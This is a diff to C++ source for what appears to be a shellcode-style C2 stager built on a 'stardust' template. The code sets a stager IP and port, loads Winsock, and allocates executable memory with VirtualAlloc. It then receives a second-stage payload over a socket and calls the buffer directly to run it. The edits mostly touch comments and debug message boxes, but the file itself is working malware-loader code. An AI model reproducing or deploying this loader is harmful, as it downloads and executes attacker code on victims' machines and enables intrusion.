@@ -4,9 +4,11 @@
 
 using namespace stardust;
 
+// Define IP adress of your C2 Stager
 #define IP_STR  "10.10.10.10"
-// Define PORT 443 of your TCP Stager
+// Define PORT 443 of your C2 Stager
 #define PORT 443
+
 // We dont have HTONS or HTONL, so we must define it manually
 #define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
 #define HTONL(x) ( \
@@ -69,7 +71,7 @@ auto declfn instance::start(
     auto Caption = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
 	auto Message = L"0";
 
-	// Load ws2_32.dll
+	// Load ws2_32.dll for Socket related Functions
     const auto ws2_32 = kernel32.LoadLibraryA(symbol<const char*>("ws2_32.dll"));
     if (ws2_32) {
         //Message = L"ws2_32.dll successfully loaded";
@@ -178,6 +180,7 @@ auto declfn instance::start(
     }
 
     // Now that we know the buffer size we can initialize Data
+	// We need VirtualAlloc from kernel32	
     const auto k32 = kernel32.LoadLibraryA(symbol<const char*>("kernel32.dll"));
     decltype(VirtualAlloc)* virtuallocfunc = RESOLVE_API(reinterpret_cast<uintptr_t>(k32), VirtualAlloc);
     data = (unsigned char*)virtuallocfunc(NULL, bufferSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -200,11 +203,9 @@ auto declfn instance::start(
     int received = 0;
 
     int remaining = bufferSize;
-    // Instance()->Win32.MessageBoxW( NULL, Message, L"Starting Filler", MB_OK );
-    // memcpy(data + 5, recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0); , bufferSize);
-    // Instance()->Win32.recv(ConnectSocket, ((char*)(data + 5)), bufferSize, 0);
+
     while (remaining > 0) {
-        //Instance()->Win32.MessageBoxW( NULL, Message, L"Starting receive", MB_OK );
+        
         received = recvfunc(ConnectSocket, (char*)(data + 5 + location), remaining, 0);
         if (received <= 0) {
             Message = L"receive remaining data error";
@@ -214,8 +215,8 @@ auto declfn instance::start(
         remaining -= received;
     }
 
-    //Message = L"We are all made of Stardust!";
-    //msgboxw(nullptr, Message, Caption, MB_OK);
+    Message = L"We are all made of Stardust!";
+    msgboxw(nullptr, Message, Caption, MB_OK);
 
     //ready to rumble
     ((void(*)())data)();
